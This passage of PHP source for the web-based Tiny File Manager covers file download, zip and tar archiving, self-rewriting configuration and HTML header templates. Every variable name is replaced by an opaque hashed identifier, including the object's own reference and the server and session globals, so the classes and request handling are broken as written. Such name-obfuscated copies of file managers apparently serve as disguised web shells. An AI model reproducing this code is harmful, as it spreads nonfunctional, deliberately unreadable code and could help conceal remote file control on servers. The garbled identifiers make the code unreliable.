    if(empty($v74ce6e31[$v49fe1a22])) {
      $v74ce6e31[$v49fe1a22] = ['application/octet-stream'];
    }
    return $v74ce6e31[$v49fe1a22];
}

/**
 * This function scans the files and folder recursively, and return matching files
 * @param string $dir
 * @param string $filter
 * @return array|null
 */
 function scan($va13c698e = '', $va30a8085 = '') {
    $v5424ec5f = FM_ROOT_PATH.'/'.$va13c698e;
     if($v5424ec5f) {
         $v0c1124a9 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($v5424ec5f));
         $v378ac1a5 = new RegexIterator($v0c1124a9, "/(" . $va30a8085 . ")/i");

         $v87c5f9cc = array();
         foreach ($v378ac1a5 as $v81f430be) {
             if (!$v81f430be->isDir()) {
                 $v3a8ad1af = $v81f430be->getFilename();
                 $vc3b3b5fe = str_replace(FM_ROOT_PATH, '', $v81f430be->getPath());
                 $v87c5f9cc[] = array(
                     "name" => $v3a8ad1af,
                     "type" => "file",
                     "path" => $vc3b3b5fe,
                 );
             }
         }
         return $v87c5f9cc;
     }
}

/**
* Parameters: downloadFile(File Location, File Name,
* max speed, is streaming
* If streaming - videos will show as videos, images as images
* instead of download prompt
* https://stackoverflow.com/a/13821992/1164642
*/
function fm_download_file($v90f81861, $v3a8ad1af, $v144e5084  = 1024)
{
    if (connection_status() != 0)
        return (false);
    $v49fe1a22 = pathinfo($v3a8ad1af, PATHINFO_EXTENSION);

    $vbd5e002b = fm_get_file_mimes($v49fe1a22);

    if(is_array($vbd5e002b)) {
        $vbd5e002b = implode(' ', $vbd5e002b);
    }

    $v0e924cb5 = filesize($v90f81861);

    if ($v0e924cb5 == 0) {
        fm_set_msg(lng('Zero byte file! Aborting download'), 'error');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));

        return (false);
    }

    @ini_set('magic_quotes_runtime', 0);
    $v25235d49 = fopen("$v90f81861", "rb");

    if ($v25235d49 === false) {
        fm_set_msg(lng('Cannot open file! Aborting download'), 'error');
        $v7e618b4f=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($v7e618b4f));
        return (false);
    }

    // headers
    header('Content-Description: File Transfer');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header("Content-Transfer-Encoding: binary");
    header("Content-Type: $vbd5e002b");

    $v3827a24a = 'attachment';

    if (strstr($v54ac8e37['HTTP_USER_AGENT'], "MSIE")) {
        $v3a8ad1af = preg_replace('/\./', '%2e', $v3a8ad1af, substr_count($v3a8ad1af, '.') - 1);
        header("Content-Disposition: $v3827a24a;filename=\"$v3a8ad1af\"");
    } else {
        header("Content-Disposition: $v3827a24a;filename=\"$v3a8ad1af\"");
    }

    header("Accept-Ranges: bytes");
    $v044d779e = 0;

    if (isset($v54ac8e37['HTTP_RANGE'])) {
        list($v6299000c, $v044d779e) = explode("=", $v54ac8e37['HTTP_RANGE']);
        str_replace($v044d779e, "-", $v044d779e);
        $vdfca7c6d = $v0e924cb5 - 1;
        $v7f820534 = $v0e924cb5 - $v044d779e;
        header("HTTP/1.1 206 Partial Content");
        header("Content-Length: $v7f820534");
        header("Content-Range: bytes $v044d779e$vdfca7c6d/$v0e924cb5");
    } else {
        $vdfca7c6d = $v0e924cb5 - 1;
        header("Content-Range: bytes 0-$vdfca7c6d/$v0e924cb5");
        header("Content-Length: " . $v0e924cb5);
    }
    $v90f81861 = realpath($v90f81861);
    while (ob_get_level()) ob_end_clean();
    readfile($v90f81861);

    fclose($v25235d49);

    return ((connection_status() == 0) and !connection_aborted());
}

/**
 * If the theme is dark, return the text-white and bg-dark classes.
 * @return string the value of the  variable.
 */
function fm_get_theme() {
    $vf7b04dff = '';
    if(FM_THEME == "dark") {
        $vf7b04dff = "text-white bg-dark";
    }
    return $vf7b04dff;
}

/**
 * Class to work with zip files (using ZipArchive)
 */
class FM_Zipper
{
    private $v0b08dbc1;

    public function __construct()
    {
        $v1e27a0bd->zip = new ZipArchive();
    }

    /**
     * Create archive with name $filename and files $files (RELATIVE PATHS!)
     * @param string $filename
     * @param array|string $files
     * @return bool
     */
    public function create($vd4413dfd, $v87c5f9cc)
    {
        $v19415ac3 = $v1e27a0bd->zip->open($vd4413dfd, ZipArchive::CREATE);
        if ($v19415ac3 !== true) {
            return false;
        }
        if (is_array($v87c5f9cc)) {
            foreach ($v87c5f9cc as $v1741b918) {
                $v1741b918 = fm_clean_path($v1741b918);
                if (!$v1e27a0bd->addFileOrDir($v1741b918)) {
                    $v1e27a0bd->zip->close();
                    return false;
                }
            }
            $v1e27a0bd->zip->close();
            return true;
        } else {
            if ($v1e27a0bd->addFileOrDir($v87c5f9cc)) {
                $v1e27a0bd->zip->close();
                return true;
            }
            return false;
        }
    }

    /**
     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
     * @param string $filename
     * @param string $path
     * @return bool
     */
    public function unzip($vd4413dfd, $v5424ec5f)
    {
        $v19415ac3 = $v1e27a0bd->zip->open($vd4413dfd);
        if ($v19415ac3 !== true) {
            return false;
        }
        if ($v1e27a0bd->zip->extractTo($v5424ec5f)) {
            $v1e27a0bd->zip->close();
            return true;
        }
        return false;
    }

    /**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */
    private function addFileOrDir($vd4413dfd)
    {
        if (is_file($vd4413dfd)) {
            return $v1e27a0bd->zip->addFile($vd4413dfd);
        } elseif (is_dir($vd4413dfd)) {
            return $v1e27a0bd->addDir($vd4413dfd);
        }
        return false;
    }

    /**
     * Add folder recursively
     * @param string $path
     * @return bool
     */
    private function addDir($v5424ec5f)
    {
        if (!$v1e27a0bd->zip->addEmptyDir($v5424ec5f)) {
            return false;
        }
        $v4a9de2ac = scandir($v5424ec5f);
        if (is_array($v4a9de2ac)) {
            foreach ($v4a9de2ac as $v81f430be) {
                if ($v81f430be != '.' && $v81f430be != '..') {
                    if (is_dir($v5424ec5f . '/' . $v81f430be)) {
                        if (!$v1e27a0bd->addDir($v5424ec5f . '/' . $v81f430be)) {
                            return false;
                        }
                    } elseif (is_file($v5424ec5f . '/' . $v81f430be)) {
                        if (!$v1e27a0bd->zip->addFile($v5424ec5f . '/' . $v81f430be)) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}

/**
 * Class to work with Tar files (using PharData)
 */
class FM_Zipper_Tar
{
    private $v3fac7e70;

    public function __construct()
    {
        $v1e27a0bd->tar = null;
    }

    /**
     * Create archive with name $filename and files $files (RELATIVE PATHS!)
     * @param string $filename
     * @param array|string $files
     * @return bool
     */
    public function create($vd4413dfd, $v87c5f9cc)
    {
        $v1e27a0bd->tar = new PharData($vd4413dfd);
        if (is_array($v87c5f9cc)) {
            foreach ($v87c5f9cc as $v1741b918) {
                $v1741b918 = fm_clean_path($v1741b918);
                if (!$v1e27a0bd->addFileOrDir($v1741b918)) {
                    return false;
                }
            }
            return true;
        } else {
            if ($v1e27a0bd->addFileOrDir($v87c5f9cc)) {
                return true;
            }
            return false;
        }
    }

    /**
     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
     * @param string $filename
     * @param string $path
     * @return bool
     */
    public function unzip($vd4413dfd, $v5424ec5f)
    {
        $v19415ac3 = $v1e27a0bd->tar->open($vd4413dfd);
        if ($v19415ac3 !== true) {
            return false;
        }
        if ($v1e27a0bd->tar->extractTo($v5424ec5f)) {
            return true;
        }
        return false;
    }

    /**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */
    private function addFileOrDir($vd4413dfd)
    {
        if (is_file($vd4413dfd)) {
            try {
                $v1e27a0bd->tar->addFile($vd4413dfd);
                return true;
            } catch (Exception $vb8673196) {
                return false;
            }
        } elseif (is_dir($vd4413dfd)) {
            return $v1e27a0bd->addDir($vd4413dfd);
        }
        return false;
    }

    /**
     * Add folder recursively
     * @param string $path
     * @return bool
     */
    private function addDir($v5424ec5f)
    {
        $v4a9de2ac = scandir($v5424ec5f);
        if (is_array($v4a9de2ac)) {
            foreach ($v4a9de2ac as $v81f430be) {
                if ($v81f430be != '.' && $v81f430be != '..') {
                    if (is_dir($v5424ec5f . '/' . $v81f430be)) {
                        if (!$v1e27a0bd->addDir($v5424ec5f . '/' . $v81f430be)) {
                            return false;
                        }
                    } elseif (is_file($v5424ec5f . '/' . $v81f430be)) {
                        try {
                            $v1e27a0bd->tar->addFile($v5424ec5f . '/' . $v81f430be);
                        } catch (Exception $vb8673196) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}

/**
 * Save Configuration
 */
 class FM_Config
{
     var $v07234e0e;

    function __construct()
    {
        global $vfe0b8949, $v736b3163, $v35ff31ce;
        $v443cd22c = $v736b3163.$v54ac8e37["PHP_SELF"];
        $v1e27a0bd->data = array(
            'lang' => 'en',
            'error_reporting' => true,
            'show_hidden' => true
        );
        $v07234e0e = false;
        if (strlen($v35ff31ce)) {
            $v07234e0e = fm_object_to_array(json_decode($v35ff31ce));
        } else {
            $v8a0e089a = 'Tiny File Manager<br>Error: Cannot load configuration';
            if (substr($v443cd22c, -1) == '/') {
                $v443cd22c = rtrim($v443cd22c, '/');
                $v8a0e089a .= '<br>';
                $v8a0e089a .= '<br>Seems like you have a trailing slash on the URL.';
                $v8a0e089a .= '<br>Try this link: <a href="' . $v443cd22c . '">' . $v443cd22c . '</a>';
            }
            die($v8a0e089a);
        }
        if (is_array($v07234e0e) && count($v07234e0e)) $v1e27a0bd->data = $v07234e0e;
        else $v1e27a0bd->save();
    }

    function save()
    {
        $vbb389fc5 = __FILE__;
        $v436ff9d7 = '$CONFIG';
        $vd8431479 = var_export(json_encode($v1e27a0bd->data), true);
        $v3510cb52 = "<?php" . chr(13) . chr(10) . "//Default Configuration".chr(13) . chr(10)."$v436ff9d7 = $vd8431479;" . chr(13) . chr(10);
        if (is_writable($vbb389fc5)) {
            $v615753bf = file($vbb389fc5);
            if ($vb8847704 = @fopen($vbb389fc5, "w")) {
                @fputs($vb8847704, $v3510cb52, strlen($v3510cb52));
                for ($v9ca1c5be = 3; $v9ca1c5be < count($v615753bf); $v9ca1c5be++) {
                    @fputs($vb8847704, $v615753bf[$v9ca1c5be], strlen($v615753bf[$v9ca1c5be]));
                }
                @fclose($vb8847704);
            }
        }
    }
}

//--- Templates Functions ---

/**
 * Show nav block
 * @param string $path
 */
function fm_show_nav_path($v5424ec5f)
{
    global $vdcd4149e, $v587463a3, $v78847cbe;
    $v99f77a28 = $v587463a3 ? 'fixed-top' : '';
    $v0751a57f = fm_get_theme();
    $v0751a57f .= " navbar-light";
    if(FM_THEME == "dark") {
        $v0751a57f .= " navbar-dark";
    } else {
        $v0751a57f .= " bg-white";
    }
    ?>
    <nav class="navbar navbar-expand-lg <?php echo $v0751a57f; ?> mb-4 main-nav <?php echo $v99f77a28 ?>">
        <a class="navbar-brand"> <?php echo lng('AppTitle') ?> </a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

            <?php
            $v5424ec5f = fm_clean_path($v5424ec5f);
            $v736b3163 = "<a href='?p='><i class='fa fa-home' aria-hidden='true' title='" . FM_ROOT_PATH . "'></i></a>";
            $v69d3ec72 = '<i class="bread-crumb"> / </i>';
            if ($v5424ec5f != '') {
                $v0bdee568 = explode('/', $v5424ec5f);
                $vc19990f9 = count($v0bdee568);
                $v1d9b7104 = array();
                $ve3964bd5 = '';
                for ($v322c36b5 = 0; $v322c36b5 < $vc19990f9; $v322c36b5++) {
                    $ve3964bd5 = trim($ve3964bd5 . '/' . $v0bdee568[$v322c36b5], '/');
                    $v46fad56c = urlencode($ve3964bd5);
                    $v1d9b7104[] = "<a href='?p={$v46fad56c}'>" . fm_enc(fm_convert_win($v0bdee568[$v322c36b5])) . "</a>";
                }
                $v736b3163 .= $v69d3ec72 . implode($v69d3ec72, $v1d9b7104);
            }
            echo '<div class="col-xs-6 col-sm-5">' . $v736b3163 . $v78847cbe . '</div>';
            ?>

            <div class="col-xs-6 col-sm-7">
                <ul class="navbar-nav justify-content-end <?php echo fm_get_theme();  ?>">
                    <li class="nav-item mr-2">
                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                            <input type="text" class="form-control" placeholder="<?php echo lng('Search') ?>" aria-label="<?php echo lng('Search') ?>" aria-describedby="search-addon2" id="search-addon">
                            <div class="input-group-append">
                                <span class="input-group-text brl-0 brr-0" id="search-addon2"><i class="fa fa-search"></i></span>
                            </div>
                            <div class="input-group-append btn-group">
                                <span class="input-group-text dropdown-toggle brl-0" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
                                  <div class="dropdown-menu dropdown-menu-right">
                                    <a class="dropdown-item" href="<?php echo $v924d1fef = $v5424ec5f ? $v5424ec5f : '.'; ?>" id="js-search-modal" data-bs-toggle="modal" data-bs-target="#searchModal"><?php echo lng('Advanced Search') ?></a>
                                  </div>
                            </div>
                        </div>
                    </li>
                    <?php if (!FM_READONLY): ?>
                    <li class="nav-item">
                        <a title="<?php echo lng('Upload') ?>" class="nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <?php echo lng('Upload') ?></a>
                    </li>
                    <li class="nav-item">
                        <a title="<?php echo lng('NewItem') ?>" class="nav-link" href="#createNewItem" data-bs-toggle="modal" data-bs-target="#createNewItem"><i class="fa fa-plus-square"></i> <?php echo lng('NewItem') ?></a>
                    </li>
                    <?php endif; ?>
                    <?php if (FM_USE_AUTH): ?>
                    <li class="nav-item avatar dropdown">
                        <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-5" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <i class="fa fa-user-circle"></i> <?php if(isset($vbc4af197[FM_SESSION_ID]['logged'])) { echo $vbc4af197[FM_SESSION_ID]['logged']; } ?></a>
                        <div class="dropdown-menu text-small shadow <?php echo fm_get_theme(); ?>" aria-labelledby="navbarDropdownMenuLink-5">
                            <?php if (!FM_READONLY): ?>
                            <a title="<?php echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php echo lng('Settings') ?></a>
                            <?php endif ?>
                            <a title="<?php echo lng('Help') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;help=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> <?php echo lng('Help') ?></a>
                            <a title="<?php echo lng('Logout') ?>" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php echo lng('Logout') ?></a>
                        </div>
                    </li>
                    <?php else: ?>
                        <?php if (!FM_READONLY): ?>
                            <li class="nav-item">
                                <a title="<?php echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php echo lng('Settings') ?></a>
                            </li>
                        <?php endif; ?>
                    <?php endif; ?>
                </ul>
            </div>
        </div>
    </nav>
    <?php
}

/**
 * Show alert message from session
 */
function fm_show_message()
{
    if (isset($vbc4af197[FM_SESSION_ID]['message'])) {
        $vb79dccb6 = isset($vbc4af197[FM_SESSION_ID]['status']) ? $vbc4af197[FM_SESSION_ID]['status'] : 'ok';
        echo '<p class="message ' . $vb79dccb6 . '">' . $vbc4af197[FM_SESSION_ID]['message'] . '</p>';
        unset($vbc4af197[FM_SESSION_ID]['message']);
        unset($vbc4af197[FM_SESSION_ID]['status']);
    }
}

/**
 * Show page header in Login Form
 */
function fm_show_header_login()
{
$v731c2527 = '20160315';
header("Content-Type: text/html; charset=utf-8");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
header("Pragma: no-cache");

global $vdcd4149e, $v736b3163, $v9b1ab6a4;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
    <meta name="author" content="CCP Programmers">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($v9b1ab6a4) { echo '<link rel="icon" href="'.fm_enc($v9b1ab6a4).'" type="image/png">'; } ?>
    <title><?php echo fm_enc(APP_TITLE) ?></title>
    <?php print_external('pre-jsdelivr'); ?>
    <?php print_external('css-bootstrap'); ?>
    <style>
        body.fm-login-page{ background-color:#f7f9fb;font-size:14px;background-color:#f7f9fb;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 304 304' width='304' height='304'%3E%3Cpath fill='%23e2e9f1' fill-opacity='0.4' d='M44.1 224a5 5 0 1 1 0 2H0v-2h44.1zm160 48a5 5 0 1 1 0 2H82v-2h122.1zm57.8-46a5 5 0 1 1 0-2H304v2h-42.1zm0 16a5 5 0 1 1 0-2H304v2h-42.1zm6.2-114a5 5 0 1 1 0 2h-86.2a5 5 0 1 1 0-2h86.2zm-256-48a5 5 0 1 1 0 2H0v-2h12.1zm185.8 34a5 5 0 1 1 0-2h86.2a5 5 0 1 1 0 2h-86.2zM258 12.1a5 5 0 1 1-2 0V0h2v12.1zm-64 208a5 5 0 1 1-2 0v-54.2a5 5 0 1 1 2 0v54.2zm48-198.2V80h62v2h-64V21.9a5 5 0 1 1 2 0zm16 16V64h46v2h-48V37.9a5 5 0 1 1 2 0zm-128 96V208h16v12.1a5 5 0 1 1-2 0V210h-16v-76.1a5 5 0 1 1 2 0zm-5.9-21.9a5 5 0 1 1 0 2H114v48H85.9a5 5 0 1 1 0-2H112v-48h12.1zm-6.2 130a5 5 0 1 1 0-2H176v-74.1a5 5 0 1 1 2 0V242h-60.1zm-16-64a5 5 0 1 1 0-2H114v48h10.1a5 5 0 1 1 0 2H112v-48h-10.1zM66 284.1a5 5 0 1 1-2 0V274H50v30h-2v-32h18v12.1zM236.1 176a5 5 0 1 1 0 2H226v94h48v32h-2v-30h-48v-98h12.1zm25.8-30a5 5 0 1 1 0-2H274v44.1a5 5 0 1 1-2 0V146h-10.1zm-64 96a5 5 0 1 1 0-2H208v-80h16v-14h-42.1a5 5 0 1 1 0-2H226v18h-16v80h-12.1zm86.2-210a5 5 0 1 1 0 2H272V0h2v32h10.1zM98 101.9V146H53.9a5 5 0 1 1 0-2H96v-42.1a5 5 0 1 1 2 0zM53.9 34a5 5 0 1 1 0-2H80V0h2v34H53.9zm60.1 3.9V66H82v64H69.9a5 5 0 1 1 0-2H80V64h32V37.9a5 5 0 1 1 2 0zM101.9 82a5 5 0 1 1 0-2H128V37.9a5 5 0 1 1 2 0V82h-28.1zm16-64a5 5 0 1 1 0-2H146v44.1a5 5 0 1 1-2 0V18h-26.1zm102.2 270a5 5 0 1 1 0 2H98v14h-2v-16h124.1zM242 149.9V160h16v34h-16v62h48v48h-2v-46h-48v-66h16v-30h-16v-12.1a5 5 0 1 1 2 0zM53.9 18a5 5 0 1 1 0-2H64V2H48V0h18v18H53.9zm112 32a5 5 0 1 1 0-2H192V0h50v2h-48v48h-28.1zm-48-48a5 5 0 0 1-9.8-2h2.07a3 3 0 1 0 5.66 0H178v34h-18V21.9a5 5 0 1 1 2 0V32h14V2h-58.1zm0 96a5 5 0 1 1 0-2H137l32-32h39V21.9a5 5 0 1 1 2 0V66h-40.17l-32 32H117.9zm28.1 90.1a5 5 0 1 1-2 0v-76.51L175.59 80H224V21.9a5 5 0 1 1 2 0V82h-49.59L146 112.41v75.69zm16 32a5 5 0 1 1-2 0v-99.51L184.59 96H300.1a5 5 0 0 1 3.9-3.9v2.07a3 3 0 0 0 0 5.66v2.07a5 5 0 0 1-3.9-3.9H185.41L162 121.41v98.69zm-144-64a5 5 0 1 1-2 0v-3.51l48-48V48h32V0h2v50H66v55.41l-48 48v2.69zM50 53.9v43.51l-48 48V208h26.1a5 5 0 1 1 0 2H0v-65.41l48-48V53.9a5 5 0 1 1 2 0zm-16 16V89.41l-34 34v-2.82l32-32V69.9a5 5 0 1 1 2 0zM12.1 32a5 5 0 1 1 0 2H9.41L0 43.41V40.6L8.59 32h3.51zm265.8 18a5 5 0 1 1 0-2h18.69l7.41-7.41v2.82L297.41 50H277.9zm-16 160a5 5 0 1 1 0-2H288v-71.41l16-16v2.82l-14 14V210h-28.1zm-208 32a5 5 0 1 1 0-2H64v-22.59L40.59 194H21.9a5 5 0 1 1 0-2H41.41L66 216.59V242H53.9zm150.2 14a5 5 0 1 1 0 2H96v-56.6L56.6 162H37.9a5 5 0 1 1 0-2h19.5L98 200.6V256h106.1zm-150.2 2a5 5 0 1 1 0-2H80v-46.59L48.59 178H21.9a5 5 0 1 1 0-2H49.41L82 208.59V258H53.9zM34 39.8v1.61L9.41 66H0v-2h8.59L32 40.59V0h2v39.8zM2 300.1a5 5 0 0 1 3.9 3.9H3.83A3 3 0 0 0 0 302.17V256h18v48h-2v-46H2v42.1zM34 241v63h-2v-62H0v-2h34v1zM17 18H0v-2h16V0h2v18h-1zm273-2h14v2h-16V0h2v16zm-32 273v15h-2v-14h-14v14h-2v-16h18v1zM0 92.1A5.02 5.02 0 0 1 6 97a5 5 0 0 1-6 4.9v-2.07a3 3 0 1 0 0-5.66V92.1zM80 272h2v32h-2v-32zm37.9 32h-2.07a3 3 0 0 0-5.66 0h-2.07a5 5 0 0 1 9.8 0zM5.9 0A5.02 5.02 0 0 1 0 5.9V3.83A3 3 0 0 0 3.83 0H5.9zm294.2 0h2.07A3 3 0 0 0 304 3.83V5.9a5 5 0 0 1-3.9-5.9zm3.9 300.1v2.07a3 3 0 0 0-1.83 1.83h-2.07a5 5 0 0 1 3.9-3.9zM97 100a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-48 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 96a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-144a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM49 36a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM33 68a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 240a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm80-176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm112 176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 180a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 84a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'%3E%3C/path%3E%3C/svg%3E");}
        .fm-login-page .brand{ width:121px;overflow:hidden;margin:0 auto;position:relative;z-index:1}
        .fm-login-page .brand img{ width:100%}
        .fm-login-page .card-wrapper{ width:360px;margin-top:10%;margin-left:auto;margin-right:auto;}
        .fm-login-page .card{ border-color:transparent;box-shadow:0 4px 8px rgba(0,0,0,.05)}
        .fm-login-page .card-title{ margin-bottom:1.5rem;font-size:24px;font-weight:400;}
        .fm-login-page .form-control{ border-width:2.3px}
        .fm-login-page .form-group label{ width:100%}
        .fm-login-page .btn.btn-block{ padding:12px 10px}
        .fm-login-page .footer{ margin:40px 0;color:#888;text-align:center}
        @media screen and (max-width:425px){
            .fm-login-page .card-wrapper{ width:90%;margin:0 auto;margin-top:10%;}
        }
        @media screen and (max-width:320px){
            .fm-login-page .card.fat{ padding:0}
            .fm-login-page .card.fat .card-body{ padding:15px}
        }
        .message{ padding:4px 7px;border:1px solid #ddd;background-color:#fff}
        .message.ok{ border-color:green;color:green}
        .message.error{ border-color:red;color:red}
        .message.alert{ border-color:orange;color:orange}
        body.fm-login-page.theme-dark {background-color: #2f2a2a;}
        .theme-dark svg g, .theme-dark svg path {fill: #ffffff; }
    </style>
</head>
<body class="fm-login-page <?php echo (FM_THEME == "dark") ? 'theme-dark' : ''; ?>">
<div id="wrapper" class="container-fluid">

    <?php
    }

    /**
     * Show page footer in Login Form
     */
    function fm_show_footer_login()
    {
    ?>
</div>
<?php print_external('js-jquery'); ?>
<?php print_external('js-bootstrap'); ?>
</body>
</html>
<?php
}

/**
 * Show Header after login
 */
function fm_show_header()
{
$v731c2527 = '20160315';
header("Content-Type: text/html; charset=utf-8");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
header("Pragma: no-cache");

global $vdcd4149e, $v736b3163, $v587463a3, $v9b1ab6a4;
$v99f77a28 = $v587463a3 ? 'navbar-fixed' : 'navbar-normal';
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
    <meta name="author" content="CCP Programmers">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($v9b1ab6a4) { echo '<link rel="icon" href="'.fm_enc($v9b1ab6a4).'" type="image/png">'; } ?>
    <title><?php echo fm_enc(APP_TITLE) ?></title>
    <?php print_external('pre-jsdelivr'); ?>
    <?php print_external('pre-cloudflare'); ?>
    <?php print_external('css-bootstrap'); ?>
    <?php print_external('css-font-awesome'); ?>
    <?php if (FM_USE_HIGHLIGHTJS && isset($v51e4dd52['view'])): ?>
    <?php print_external('css-highlightjs'); ?>
    <?php endif; ?>
    <script type="text/javascript">window.csrf = '<?php echo $vbc4af197['token']; ?>';</script>
    <style>
        html { -moz-osx-font-smoothing: grayscale; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; height: 100%; scroll-behavior: smooth;}
        *,*::before,*::after { box-sizing: border-box;}
        body { font-size:15px; color:#222;background:#F7F7F7; }
        body.navbar-fixed { margin-top:55px; }
        a, a:hover, a:visited, a:focus { text-decoration:none !important; }
        .filename, td, th { white-space:nowrap  }
        .navbar-brand { font-weight:bold; }
        .nav-item.avatar a { cursor:pointer;text-transform:capitalize; }
        .nav-item.avatar a > i { font-size:15px; }
        .nav-item.avatar .dropdown-menu a { font-size:13px; }
        #search-addon { font-size:12px;border-right-width:0; }
        .brl-0 { background:transparent;border-left:0; border-top-left-radius: 0; border-bottom-left-radius: 0; }
